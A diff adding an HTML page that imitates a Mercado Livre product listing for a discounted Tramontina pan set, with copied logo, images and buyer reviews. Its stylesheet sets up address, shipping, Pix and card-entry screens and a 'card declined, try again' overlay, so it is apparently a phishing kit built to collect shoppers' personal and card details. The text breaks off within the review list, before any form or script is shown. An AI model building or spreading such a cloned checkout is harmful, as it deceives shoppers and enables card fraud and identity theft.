@@ -1,0 +1,1196 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+  <title>Mercado Livre</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+    body { margin: 0; font-family: 'Inter', sans-serif; background: #ebebeb; color: #333; font-size: 15px; line-height: 1.5; }
+    img { max-width: 100%; display: block; }
+    .hidden { display: none !important; }
+
+    #telaLoading { position: fixed; inset: 0; background: #fff; display: flex; flex-direction: column;
+      align-items: center; justify-content: center; z-index: 9999; gap: 16px; }
+    #telaLoading .loader { width: 48px; height: 48px; border: 4px solid #ffe600;
+      border-top-color: #3483fa; border-radius: 50%; animation: spin 0.8s linear infinite; }
+    #telaLoading p { font-size: 14px; color: #666; margin: 0; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .nav-header { background: #ffe600; padding: 8px 0; position: sticky; top: 0; z-index: 100; }
+    .nav-bounds { max-width: 1200px; margin: 0 auto; padding: 0 12px;
+      display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+    .nav-logo { font-size: 0; width: 64px; height: 22px; flex-shrink: 0;
+      background: url('https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/logo__large_plus.png') center/contain no-repeat; }
+    .nav-search { flex: 1; display: flex; background: #fff; border-radius: 4px; overflow: hidden; min-width: 0; }
+    .nav-search input { flex: 1; border: none; padding: 10px 12px; font-size: 15px; outline: none; min-width: 0; }
+    .nav-search button { background: #fff; border: none; padding: 0 12px; cursor: pointer; border-left: 1px solid #eee; }
+    .nav-search button svg { width: 20px; height: 20px; fill: #666; }
+    .nav-topbar { background: #fff; border-bottom: 1px solid #e0e0e0; padding: 8px 0;
+      font-size: 13px; overflow-x: auto; -webkit-overflow-scrolling: touch; scrollbar-width: none; }
+    .nav-topbar::-webkit-scrollbar { display: none; }
+    .nav-topbar .nav-bounds { gap: 16px; flex-wrap: nowrap; white-space: nowrap; padding: 0 12px; }
+    .nav-topbar a { color: #555; text-decoration: none; flex-shrink: 0; }
+    .nav-topbar a:first-child { font-weight: 600; color: #333; }
+    .banner-meli { background: #fff; text-align: center; padding: 6px 0; }
+    .banner-meli img { max-height: 45px; margin: 0 auto; }
+    .breadcrumb { max-width: 1200px; margin: 10px auto 0; padding: 0 12px; font-size: 12px;
+      color: #666; overflow-x: auto; white-space: nowrap; scrollbar-width: none; }
+    .breadcrumb::-webkit-scrollbar { display: none; }
+    .breadcrumb a { color: #666; text-decoration: none; }
+    .breadcrumb span { margin: 0 4px; }
+    .container { max-width: 1200px; margin: 0 auto; padding: 8px; }
+    .produto { background: #fff; border-radius: 8px; padding: 12px;
+      display: grid; grid-template-columns: 1fr; gap: 16px; }
+    @media (min-width: 768px) { .produto { padding: 24px; grid-template-columns: 1fr 1fr; gap: 32px; } }
+    .galeria { display: flex; flex-direction: column; gap: 10px; }
+    .galeria__principal { width: 100%; border-radius: 8px; object-fit: contain; background: #fafafa; max-height: 380px; }
+    .galeria__miniaturas { display: flex; gap: 6px; overflow-x: auto; -webkit-overflow-scrolling: touch;
+      scrollbar-width: none; padding-bottom: 4px; }
+    .galeria__miniaturas::-webkit-scrollbar { display: none; }
+    .galeria__miniaturas img { width: 56px; height: 56px; object-fit: cover; border: 2px solid #ddd;
+      border-radius: 6px; cursor: pointer; opacity: 0.75; transition: 0.2s; flex-shrink: 0; }
+    .galeria__miniaturas img:hover, .galeria__miniaturas img.ativa { opacity: 1; border-color: #3483fa; }
+    .info h1 { font-size: 20px; font-weight: 600; margin: 0 0 8px; line-height: 1.3; }
+    .subtitulo { font-size: 13px; color: #666; margin-bottom: 12px; }
+    .avaliacao { display: flex; align-items: center; gap: 6px; margin-bottom: 12px; font-size: 13px; flex-wrap: wrap; }
+    .estrelas { color: #3483fa; font-size: 16px; }
+    .preco-original { text-decoration: line-through; color: #999; font-size: 14px; }
+    .preco { font-size: 30px; font-weight: 700; margin: 4px 0; color: #000;
+      display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+    .desconto { display: inline-block; background: #00a650; color: #fff; font-size: 12px;
+      font-weight: 600; padding: 2px 8px; border-radius: 4px; }
+    .pix { color: #00a650; font-size: 14px; font-weight: 600; margin-bottom: 4px; }
+    .parcelamento { font-size: 14px; color: #333; margin-bottom: 16px; }
+    .variacao { margin-bottom: 16px; }
+    .variacao label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px; }
+    .variacao__opcoes { display: flex; gap: 8px; flex-wrap: wrap; }
+    .variacao__botao { padding: 8px 16px; border: 1px solid #ddd; border-radius: 6px;
+      background: #fff; font-size: 14px; cursor: pointer; }
+    .variacao__botao.selecionado { border-color: #3483fa; background: #e8f0fe; font-weight: 600; }
+    .btn-comprar { width: 100%; padding: 14px; background: #3483fa; color: #fff; font-size: 16px;
+      font-weight: 600; border: none; border-radius: 6px; cursor: pointer; margin-bottom: 8px; }
+    .btn-carrinho { width: 100%; padding: 14px; background: #e8f0fe; color: #3483fa;
+      font-size: 16px; font-weight: 600; border: none; border-radius: 6px; cursor: pointer; }
+    .caracteristicas, .descricao, .opinioes { background: #fff; border-radius: 8px; padding: 16px; margin-top: 8px; }
+    @media (min-width: 768px) { .caracteristicas, .descricao, .opinioes { padding: 24px; margin-top: 16px; } }
+    .caracteristicas h2, .descricao h2, .opinioes h2 { font-size: 18px; margin: 0 0 12px; }
+    .caracteristicas__grid { display: grid; grid-template-columns: 1fr; gap: 10px; }
+    @media (min-width: 600px) { .caracteristicas__grid { grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); } }
+    .caracteristica { display: flex; gap: 6px; font-size: 14px; }
+    .caracteristica__chave { font-weight: 600; color: #333; flex-shrink: 0; }
+    .caracteristica__valor { color: #555; }
+    .descricao p { font-size: 14px; line-height: 1.6; color: #444; margin: 0 0 10px; white-space: pre-line; }
+    .opinioes__resumo { display: grid; grid-template-columns: 1fr; gap: 16px; align-items: center;
+      margin-bottom: 20px; padding-bottom: 20px; border-bottom: 1px solid #eee; }
+    @media (min-width: 600px) { .opinioes__resumo { grid-template-columns: auto 1fr; gap: 32px; } }
+    .nota-geral { text-align: center; }
+    .nota-geral__valor { font-size: 44px; font-weight: 700; color: #333; line-height: 1; }
+    .nota-geral__estrelas { font-size: 20px; color: #3483fa; margin: 6px 0 2px; }
+    .nota-geral__total { font-size: 13px; color: #666; }
+    .barras { display: flex; flex-direction: column; gap: 6px; width: 100%; }
+    .barra { display: flex; align-items: center; gap: 8px; font-size: 13px; }
+    .barra__nivel { width: 18px; text-align: right; color: #666; }
+    .barra__trilha { flex: 1; height: 8px; background: #eee; border-radius: 4px; overflow: hidden; }
+    .barra__preenchimento { height: 100%; background: #3483fa; border-radius: 4px; }
+    .barra__porcentagem { width: 40px; text-align: right; color: #999; font-size: 12px; }
+    .resumo-ia { background: #f0f7ff; border: 1px solid #d0e3ff; border-radius: 8px; padding: 12px;
+      margin-bottom: 20px; display: flex; gap: 10px; align-items: flex-start; }
+    .resumo-ia__icone { font-size: 22px; flex-shrink: 0; }
+    .resumo-ia__texto { font-size: 13px; line-height: 1.6; color: #444; margin: 0; }
+    .resumo-ia__label { font-size: 11px; color: #3483fa; font-weight: 600; text-transform: uppercase;
+      letter-spacing: 0.5px; margin-bottom: 4px; display: block; }
+    .comentarios { display: flex; flex-direction: column; gap: 16px; }
+    .comentario { border-bottom: 1px solid #eee; padding-bottom: 16px; }
+    .comentario:last-child { border-bottom: none; padding-bottom: 0; }
+    .comentario__header { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; flex-wrap: wrap; }
+    .comentario__estrelas { color: #3483fa; font-size: 14px; }
+    .comentario__data { font-size: 12px; color: #999; }
+    .comentario__texto { font-size: 14px; line-height: 1.6; color: #333; margin: 0 0 10px; }
+    .comentario__fotos { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 10px; }
+    .comentario__fotos img { width: 76px; height: 76px; object-fit: cover; border-radius: 6px;
+      border: 1px solid #e0e0e0; cursor: pointer; transition: transform 0.2s; }
+    .comentario__fotos img:active { transform: scale(0.96); }
+    .comentario__footer { display: flex; align-items: center; gap: 12px; font-size: 13px; color: #666; }
+    .comentario__util { display: flex; align-items: center; gap: 4px; background: none;
+      border: 1px solid #ddd; border-radius: 16px; padding: 5px 12px; font-size: 13px; color: #666; cursor: pointer; }
+    .comentario__util:active { border-color: #3483fa; color: #3483fa; }
+    .termos-busca, .busca-letra { max-width: 1200px; margin: 8px auto 0; background: #fff;
+      border-radius: 8px; padding: 16px; }
+    @media (min-width: 768px) { .termos-busca, .busca-letra, .rodape { margin-top: 16px; padding: 24px; } }
+    .termos-busca h2, .busca-letra h2 { font-size: 16px; font-weight: 600; margin: 0 0 12px; }
+    .termos-busca__chips { display: flex; flex-wrap: wrap; gap: 6px; }
+    .termos-busca__chips a { display: inline-block; padding: 6px 10px; background: #f5f5f5;
+      border: 1px solid #e0e0e0; border-radius: 16px; font-size: 12px; color: #333; text-decoration: none; }
+    .termos-busca__chips a:active { background: #e8f0fe; border-color: #3483fa; color: #3483fa; }
+    .busca-letra__alfabeto { display: flex; flex-wrap: wrap; align-items: center; gap: 2px; font-size: 14px; }
+    .busca-letra__alfabeto a { display: inline-flex; align-items: center; justify-content: center;
+      min-width: 26px; height: 26px; padding: 0 4px; border-radius: 4px; color: #3483fa; font-weight: 600; text-decoration: none; }
+    .busca-letra__alfabeto a:active { background: #e8f0fe; }
+    .busca-letra__alfabeto span { color: #999; font-size: 11px; }
+    .rodape { max-width: 1200px; margin: 8px auto 16px; background: #fff; border-radius: 8px; padding: 16px; }
+    .rodape h3 { font-size: 16px; margin: 0 0 10px; }
+    .rodape__copyright { font-size: 12px; color: #666; margin: 0 0 16px; }
+    .rodape__links { display: flex; flex-wrap: wrap; gap: 10px 16px; margin-bottom: 16px; }
+    .rodape__links a { font-size: 12px; color: #3483fa; text-decoration: none; }
+    .rodape__legal { font-size: 11px; color: #999; line-height: 1.6; margin: 0;
+      padding-top: 12px; border-top: 1px solid #e0e0e0; }
+    @media (max-width: 768px) { .termos-busca, .busca-letra, .rodape { margin-left: 8px; margin-right: 8px; } }
+
+    .end-wrap { max-width: 420px; margin: 0 auto; padding: 20px; background: #fff; min-height: 100vh; }
+    .end-wrap header { background: #ffe600; padding: 15px; text-align: center; font-weight: 500;
+      font-size: 17px; position: relative; margin: -20px -20px 20px; }
+    .end-wrap header a { position: absolute; left: 15px; top: 50%; transform: translateY(-50%);
+      text-decoration: none; font-size: 24px; color: black; }
+    .end-wrap label { display: block; margin-top: 16px; font-size: 14px; font-weight: 500; color: #333; }
+    .end-wrap input, .end-wrap select { width: 100%; padding: 12px; margin-top: 6px;
+      border: 1.5px solid #ccc; border-radius: 8px; font-size: 15px; outline: none; }
+    .end-wrap input:focus, .end-wrap select:focus { border-color: #3483fa; }
+    .end-wrap small { color: #888; font-size: 12px; margin-top: 4px; display: block; }
+    .end-wrap .button-container { margin-top: 24px; }
+    .end-wrap button { background-color: #3483fa; color: white; border: none; padding: 14px 0;
+      font-size: 16px; font-weight: 500; border-radius: 8px; cursor: pointer; width: 100%; }
+
+    .frete-wrap { max-width: 480px; margin: 0 auto; padding: 20px; background: #fff; min-height: 100vh; }
+    .frete-wrap header { background: #ffe600; padding: 15px; text-align: center; font-weight: bold;
+      font-size: 16px; position: relative; margin: -20px -20px 20px; }
+    .frete-wrap header a { position: absolute; left: 15px; top: 50%; transform: translateY(-50%);
+      text-decoration: none; font-size: 24px; color: black; }
+    .endereco-box { margin-bottom: 20px; font-size: 14px; color: #333; background: #f8f8f8;
+      border-radius: 8px; padding: 12px; line-height: 1.6; }
+    .envio-full { display: flex; align-items: center; background-color: #f5f5f5; padding: 10px;
+      border-radius: 8px; margin-bottom: 20px; font-size: 16px; }
+    .opcoes-frete { border: 1px solid #ddd; border-radius: 8px; padding: 15px; background: #fff; }
+    .opcao { display: flex; align-items: center; margin-bottom: 15px; font-size: 16px; color: #333; }
+    .opcao:last-child { margin-bottom: 0; }
+    .opcao input[type="radio"] { appearance: none; width: 20px; height: 20px;
+      border: 2px solid #3483fa; border-radius: 50%; margin-right: 10px; position: relative; flex-shrink: 0; }
+    .opcao input[type="radio"]:checked::before { content: ""; position: absolute; width: 12px; height: 12px;
+      background: #3483fa; border-radius: 50%; top: 2px; left: 2px; }
+    .opcao label { flex: 1; }
+    .gratis { color: #00a650; font-weight: bold; margin-left: auto; }
+    .frete-wrap .button-container { margin-top: 30px; }
+    .frete-wrap button { background-color: #3483fa; color: white; border: none; padding: 14px 0;
+      font-size: 18px; border-radius: 8px; cursor: pointer; width: 100%; }
+
+    .pag-wrap { max-width: 480px; margin: 0 auto; background: #fff; min-height: 100vh;
+      display: flex; flex-direction: column; }
+    .pag-wrap header { background-color: #ffe600; padding: 15px; text-align: center; font-weight: 500;
+      font-size: 18px; position: relative; }
+    .pag-wrap header a { position: absolute; left: 15px; top: 50%; transform: translateY(-50%);
+      text-decoration: none; font-size: 24px; color: black; }
+    .pag-main { padding: 20px; flex-grow: 1; overflow-y: auto; -webkit-overflow-scrolling: touch; }
+    .pag-titulo { font-size: 20px; font-weight: 500; margin-bottom: 20px; color: #333; text-align: center; }
+    .metodos-pagamento { border: 1px solid #ddd; border-radius: 8px; background: #fff; padding: 15px; }
+    .metodo { display: flex; align-items: center; padding: 15px 10px; font-size: 16px;
+      border-bottom: 1px solid #eee; cursor: pointer; text-decoration: none; color: inherit;
+      background: none; border-left: none; border-right: none; border-top: none; width: 100%; text-align: left; }
+    .metodo:last-child { border-bottom: none; }
+    .metodo img { width: 32px; height: 32px; margin-right: 15px; }
+    .metodo-info { flex-grow: 1; color: #333; display: flex; flex-direction: column; font-weight: 400; }
+    .metodo-info small { font-size: 12px; color: #00a650; margin-top: 3px; }
+    .recomendado { background: #000; color: #fff; font-size: 10px; padding: 2px 6px;
+      border-radius: 10px; margin-left: 10px; height: 18px; display: flex; align-items: center; }
+    .pag-footer { padding: 15px; border-top: 1px solid #eee; font-size: 16px;
+      display: flex; justify-content: space-between; align-items: center; background: #fff; }
+    .pag-footer strong { font-size: 18px; }
+
+    .pix-wrap { max-width: 480px; margin: 0 auto; background: #f1f1f1; min-height: 100vh;
+      display: flex; flex-direction: column; align-items: center; }
+    .pix-wrap header { background-color: #ffe600; padding: 15px; width: 100%; text-align: center;
+      font-weight: bold; font-size: 18px; position: relative; }
+    .pix-wrap header a { position: absolute; left: 15px; top: 50%; transform: translateY(-50%);
+      text-decoration: none; font-size: 24px; color: black; }
+    .pix-mensagem { font-size: 18px; color: #333; margin: 60px auto; text-align: center; padding: 0 20px; }
+    .pix-box { display: none; background-color: #fff; border-radius: 8px; padding: 20px;
+      max-width: 420px; width: 90%; box-shadow: 0 2px 8px rgba(0,0,0,0.2); margin-top: 30px;
+      margin-bottom: 30px; text-align: center; }
+    .pix-box .topo { background-color: #00a650; color: #fff; padding: 15px;
+      border-radius: 6px 6px 0 0; font-size: 16px; font-weight: bold; text-align: center; margin: -20px -20px 0; }
+    .pix-box .conteudo { padding: 20px 0 0; }
+    .pix-box ol { padding-left: 20px; margin: 10px 0 20px; text-align: left; }
+    .pix-box input { width: 100%; padding: 12px; font-size: 14px; border: 1px solid #ccc;
+      border-radius: 8px; margin-bottom: 10px; text-align: center; }
+    .pix-box button { width: 100%; padding: 12px; background-color: #3483fa; color: #fff;
+      font-weight: bold; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
+    .pix-box .nota { margin-top: 10px; font-size: 14px; color: #666; text-align: center; }
+    .qrcode-container { margin: 20px 0; display: flex; justify-content: center; }
+    .qrcode-container img { max-width: 180px; height: auto; border: 1px solid #eee; padding: 5px; border-radius: 5px; }
+
+    .cartao-wrap { max-width: 480px; margin: 0 auto; background: #fff; min-height: 100vh; }
+    .cartao-wrap header { background-color: #ffe600; padding: 15px; text-align: center; font-weight: bold;
+      font-size: 18px; position: relative; }
+    .cartao-wrap header a { position: absolute; left: 15px; top: 50%; transform: translateY(-50%);
+      text-decoration: none; font-size: 24px; color: black; }
+    .card-preview { width: 320px; height: 200px; background: linear-gradient(#eee, #ccc);
+      border-radius: 12px; margin: 20px auto; position: relative; max-width: 90%; }
+    .bandeira { position: absolute; top: 10px; right: 10px; height: 40px; }
+    .cartao-wrap .container { max-width: 480px; margin: auto; padding: 20px; }
+    .cartao-wrap .slide { display: none; }
+    .cartao-wrap .slide.active { display: block; }
+    .cartao-wrap label { font-weight: bold; font-size: 14px; color: #333; display: block; margin-bottom: 5px; }
+    .cartao-wrap input { width: 100%; padding: 12px; border: 2px solid #ccc; border-radius: 8px;
+      font-size: 16px; margin-bottom: 20px; outline: none; }
+    .cartao-wrap .navigation { display: flex; justify-content: space-between; margin: 20px auto;
+      padding: 0 20px; font-size: 16px; }
+    .cartao-wrap .navigation button { border: none; background: none; color: #3483fa;
+      font-weight: bold; font-size: 16px; cursor: pointer; }
+    .cartao-wrap .navigation button:disabled { color: #ccc; cursor: not-allowed; }
+    .cartao-wrap .btn-pagar { width: 90%; margin: 20px auto; display: block; padding: 14px;
+      background-color: #3483fa; color: white; font-size: 18px; border: none; border-radius: 8px; cursor: pointer; }
+
+    .processando, .recusado { position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(255,255,255,0.95); display: none; justify-content: center; align-items: center;
+      font-size: 24px; font-weight: bold; z-index: 9999; flex-direction: column; }
+    .recusado { background: #ff3b30; color: white; }
+    .recusado .icon { font-size: 80px; margin-bottom: 20px; }
+    .recusado .mensagem { font-size: 22px; margin-bottom: 10px; text-align: center; font-weight: 500; }
+    .recusado .submensagem { font-size: 16px; margin-bottom: 20px; text-align: center; max-width: 300px; }
+    .recusado .btn-tentar { background-color: #fff; color: #ff3b30; border: none;
+      padding: 12px 24px; font-size: 16px; border-radius: 8px; font-weight: bold; cursor: pointer; }
+
+    #lightbox { position: fixed; inset: 0; background: rgba(0,0,0,0.92); z-index: 99999;
+      display: none; align-items: center; justify-content: center; padding: 20px; }
+    #lightbox img { max-width: 100%; max-height: 90vh; object-fit: contain; border-radius: 8px; }
+    #lightbox .fechar { position: absolute; top: 20px; right: 20px; background: #fff; color: #000;
+      border: none; width: 44px; height: 44px; border-radius: 50%; font-size: 24px; cursor: pointer;
+      display: flex; align-items: center; justify-content: center; font-weight: bold; }
+  </style>
+</head>
+<body>
+
+  <div id="telaLoading" class="hidden">
+    <div class="loader"></div>
+    <p>Processando sua compra…</p>
+  </div>
+
+  <div id="lightbox" onclick="if(event.target.id==='lightbox')fecharLightbox()">
+    <button class="fechar" onclick="fecharLightbox()">×</button>
+    <img id="lightboxImg" src="" alt="Foto ampliada">
+  </div>
+
+  <!-- SITE -->
+  <div id="appSite">
+    <header class="nav-header">
+      <div class="nav-bounds">
+        <a href="#" class="nav-logo" aria-label="Mercado Livre"></a>
+        <form class="nav-search" onsubmit="event.preventDefault();">
+          <input type="text" placeholder="Buscar no Mercado Livre">
+          <button type="submit" aria-label="Buscar">
+            <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.47 6.47 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+          </button>
+        </form>
+      </div>
+    </header>
+    <div class="nav-topbar">
+      <div class="nav-bounds">
+        <a href="#" id="btnCepTopo" onclick="abrirModalCep(); return false;">📍 Informe seu CEP</a><a href="#">Categorias</a><a href="#">Ofertas</a>
+        <a href="#">Cupons</a><a href="#">Supermercado</a><a href="#">Moda</a>
+        <a href="#">Mercado Play</a><a href="#">Vender</a><a href="#">Contato</a>
+      </div>
+    </div>
+    <div class="banner-meli">
+      <img src="https://http2.mlstatic.com/D_NQ_700026-MLA117883897048_102026-OO.webp" alt="MELI+ WEEK">
+    </div>
+    <div class="breadcrumb">
+      <a href="#">Casa</a> <span>›</span><a href="#">Cozinha</a> <span>›</span>
+      <a href="#">Cozimento</a> <span>›</span><a href="#">Panelas</a> <span>›</span>
+      <a href="#">Jogo de Panelas</a>
+    </div>
+
+    <div class="container">
+      <div class="produto">
+        <div class="galeria">
+          <img class="galeria__principal" id="imagemPrincipal"
+               src="https://http2.mlstatic.com/D_NQ_NP_664015-MLA95696482092_102025-O.webp"
+               alt="Jogo De Panelas Paris Com 5 Peças Chumbo Tramontina">
+          <div class="galeria__miniaturas">
+            <img src="https://http2.mlstatic.com/D_Q_NP_664015-MLA95696482092_102025-R.webp" class="ativa" onclick="trocarImagem(this,'https://http2.mlstatic.com/D_NQ_NP_664015-MLA95696482092_102025-O.webp')">
+            <img src="https://http2.mlstatic.com/D_Q_NP_715587-MLA84536583464_052025-R.webp" onclick="trocarImagem(this,'https://http2.mlstatic.com/D_NQ_NP_715587-MLA84536583464_052025-O.webp')">
+            <img src="https://http2.mlstatic.com/D_Q_NP_909613-MLA84536685452_052025-R.webp" onclick="trocarImagem(this,'https://http2.mlstatic.com/D_NQ_NP_909613-MLA84536685452_052025-O.webp')">
+            <img src="https://http2.mlstatic.com/D_Q_NP_876775-MLA84834861393_052025-R.webp" onclick="trocarImagem(this,'https://http2.mlstatic.com/D_NQ_NP_876775-MLA84834861393_052025-O.webp')">
+            <img src="https://http2.mlstatic.com/D_Q_NP_684061-MLA84834918515_052025-R.webp" onclick="trocarImagem(this,'https://http2.mlstatic.com/D_NQ_NP_684061-MLA84834918515_052025-O.webp')">
+            <img src="https://http2.mlstatic.com/D_Q_NP_821236-MLA84536685492_052025-R.webp" onclick="trocarImagem(this,'https://http2.mlstatic.com/D_NQ_NP_821236-MLA84536685492_052025-O.webp')">
+            <img src="https://http2.mlstatic.com/D_Q_NP_878061-MLA84834918535_052025-R.webp" onclick="trocarImagem(this,'https://http2.mlstatic.com/D_NQ_NP_878061-MLA84834918535_052025-O.webp')">
+          </div>
+        </div>
+        <div class="info">
+          <h1>Jogo De Panelas Paris Com 5 Peças Chumbo Tramontina</h1>
+          <p class="subtitulo">Novo | +10 mil vendidos</p>
+          <div class="avaliacao"><span class="estrelas">★★★★★</span><span>4.9</span><span class="subtitulo">(3.498)</span></div>
+          <div class="preco-original">R$ 363,02</div>
+          <div class="preco">R$ 159,44 <span class="desconto">56% OFF</span></div>
+          <div class="pix">no Pix</div>
+          <div class="parcelamento">ou R$ 169,90 em outros meios</div>
+          <div class="variacao">
+            <label>Cor: Chumbo</label>
+            <div class="variacao__opcoes"><button class="variacao__botao selecionado">Chumbo</button></div>
+          </div>
+          <button class="btn-comprar" onclick="comprarAgora()">Comprar agora</button>
+          <button class="btn-carrinho">🛒 Adicionar ao carrinho</button>
+        </div>
+      </div>
+
+      <div class="caracteristicas">
+        <h2>Características do produto</h2>
+        <div class="caracteristicas__grid">
+          <div class="caracteristica"><span class="caracteristica__chave">Marca:</span><span class="caracteristica__valor">Tramontina</span></div>
+          <div class="caracteristica"><span class="caracteristica__chave">Linha:</span><span class="caracteristica__valor">Paris</span></div>
+          <div class="caracteristica"><span class="caracteristica__chave">Modelo:</span><span class="caracteristica__valor">Jogo de Panelas Paris</span></div>
+          <div class="caracteristica"><span class="caracteristica__chave">Peças:</span><span class="caracteristica__valor">5</span></div>
+          <div class="caracteristica"><span class="caracteristica__chave">Cor:</span><span class="caracteristica__valor">Chumbo</span></div>
+          <div class="caracteristica"><span class="caracteristica__chave">Material:</span><span class="caracteristica__valor">Alumínio antiaderente Starflon Max</span></div>
+          <div class="caracteristica"><span class="caracteristica__chave">Inclui:</span><span class="caracteristica__valor">1 chaleira, 2 panelas, 1 frigideira, 1 caçarola</span></div>
+          <div class="caracteristica"><span class="caracteristica__chave">Indução:</span><span class="caracteristica__valor">Não</span></div>
+          <div class="caracteristica"><span class="caracteristica__chave">Antiaderente:</span><span class="caracteristica__valor">Sim</span></div>
+          <div class="caracteristica"><span class="caracteristica__chave">Lava-louças:</span><span class="caracteristica__valor">Sim</span></div>
+        </div>
+      </div>
+
+      <div class="descricao">
+        <h2>Descrição</h2>
+        <p>ESSENCIAIS NA COZINHA!
+
+O Jogo de Panelas Paris da Tramontina é ideal para quem busca aliar funcionalidade e design elegante na cozinha. Composto por 5 peças na cor chumbo, este conjunto oferece durabilidade e resistência, graças ao revestimento antiaderente Starflon Max.
+
+As panelas e frigideiras têm cabos ergonômicos, proporcionando conforto durante o manuseio, e tampas de vidro temperado que facilitam o acompanhamento do cozimento.
+
+DIMENSÕES E PESO:
+Altura: 13,20 cm
+Comprimento: 53,60 cm
+Largura: 43 cm
+Peso: 3,845 kg
+
+ATENÇÃO:
+*A capacidade máxima para cozimento é de 3/4 da capacidade total da peça.
+*Posicione os cabos voltados ao centro do fogão.
+*Utensílios quentes devem estar fora do alcance das crianças.</p>
+      </div>
+
+      <div class="opinioes">
+        <h2>Opiniões do produto</h2>
+        <div class="opinioes__resumo">
+          <div class="nota-geral">
+            <div class="nota-geral__valor">4.9</div>
+            <div class="nota-geral__estrelas">★★★★★</div>
+            <div class="nota-geral__total">3.498 avaliações</div>
+          </div>
+          <div class="barras">
+            <div class="barra"><span class="barra__nivel">5</span><div class="barra__trilha"><div class="barra__preenchimento" style="width:94.08%"></div></div><span class="barra__porcentagem">94%</span></div>
+            <div class="barra"><span class="barra__nivel">4</span><div class="barra__trilha"><div class="barra__preenchimento" style="width:4.66%"></div></div><span class="barra__porcentagem">4%</span></div>
+            <div class="barra"><span class="barra__nivel">3</span><div class="barra__trilha"><div class="barra__preenchimento" style="width:0.57%"></div></div><span class="barra__porcentagem">1%</span></div>
+            <div class="barra"><span class="barra__nivel">2</span><div class="barra__trilha"><div class="barra__preenchimento" style="width:0.17%"></div></div><span class="barra__porcentagem">0%</span></div>
+            <div class="barra"><span class="barra__nivel">1</span><div class="barra__trilha"><div class="barra__preenchimento" style="width:0.51%"></div></div><span class="barra__porcentagem">1%</span></div>
+          </div>
+        </div>
+        <div class="resumo-ia">
+          <div class="resumo-ia__icone">🤖</div>
+          <div>
+            <span class="resumo-ia__label">Resumo de opiniões gerado por IA</span>
+            <p class="resumo-ia__texto">O jogo de panelas é elogiado por seu excelente custo-benefício e material resistente, com um acabamento impecável e limpeza fácil. A marca é confiável e as panelas são muito bonitas.</p>
+          </div>
+        </div>
+        <div class="comentarios">
+          <div class="comentario">
+            <div class="comentario__header"><span class="comentario__estrelas">★★★★★</span><span class="comentario__data">Brasil · Há mais de 1 ano</span></div>
+            <p class="comentario__texto">Estava na dúvida entre este produto ou em cerâmica. Pelo valor optei por este modelo e simplesmente amei!!! muito bom mesmo!!!!!! super recomendo.</p>
+            <div class="comentario__fotos"><img src="https://http2.mlstatic.com/D_NQ_NP_2X_957516-MLA74797680990_032024-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)"></div>
+            <div class="comentario__footer"><button class="comentario__util">👍 Útil · 50</button></div>
+          </div>
+          <div class="comentario">
+            <div class="comentario__header"><span class="comentario__estrelas">★★★★★</span><span class="comentario__data">Brasil · Há mais de 1 ano</span></div>
+            <p class="comentario__texto">Só faltou uma caçarola de 24cm para o jogo ser perfeito. Alumínio otimo teflon perfeito tbm.</p>
+            <div class="comentario__fotos">
+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_891817-MLA74914893636_032024-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_735170-MLA75053581249_032024-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+            </div>
+            <div class="comentario__footer"><button class="comentario__util">👍 Útil · 38</button></div>
+          </div>
+          <div class="comentario">
+            <div class="comentario__header"><span class="comentario__estrelas">★★★★★</span><span class="comentario__data">Brasil · Há 1 ano</span></div>
+            <p class="comentario__texto">Amei minha compra, as panelas são de excelente qualidade. Material é grosso e pesado, não imaginava que seria tão boas pelo preço. Super indico e recomendo, pode comprar sem medo.</p>
+            <div class="comentario__fotos">
+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_624513-MLA81388446390_122024-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_870882-MLA81657876325_122024-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+            </div>
+            <div class="comentario__footer"><button class="comentario__util">👍 Útil · 20</button></div>
+          </div>
+          <div class="comentario">
+            <div class="comentario__header"><span class="comentario__estrelas">★★★★★</span><span class="comentario__data">Brasil · Há mais de 1 ano</span></div>
+            <p class="comentario__texto">Panelas lindas e de boa qualidade. Eu amei 😍😍😍.</p>
+            <div class="comentario__fotos">
+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_690679-MLA74701097090_022024-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+              <img src="https://http2.mlstatic.com/D_NQ_NP_2X_833062-MLA74832420203_022024-O.webp" alt="Foto do comprador" onclick="abrirLightbox(this.src)">
+            </div>
+            <div class="comentario__footer"><button class="comentario__util">👍 Útil · 18</button></div>
+          </div>
+          <div class="comentario">
+            <div class="comentario__header"><span class="comentario__estrelas">★★★★★</span><span class="comentario__data">Brasil · Há mais de 1 ano</span></div>
+            <p class="comentario__texto">Amei meu jogo de panelas, são grandes. Um pouco pesada, gostei tanto que já comprei outro kit da vermelha, sem contar que na cor chumbo é muito linda 😃😃.</p>
+            <div class="comentario__fotos">
